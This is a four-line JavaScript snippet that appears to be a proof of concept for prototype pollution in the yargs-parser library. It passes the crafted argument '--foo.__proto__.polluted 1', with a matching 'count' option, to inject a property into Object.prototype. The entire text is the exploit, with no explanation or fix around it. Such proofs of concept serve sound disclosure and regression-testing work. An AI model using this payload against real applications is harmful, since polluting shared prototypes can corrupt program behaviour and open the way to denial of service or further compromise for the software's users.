
const parser = require("yargs-parser");
parser("--foo.__proto__.polluted 1", { 
  count: ["foo.__proto__.polluted"]
});
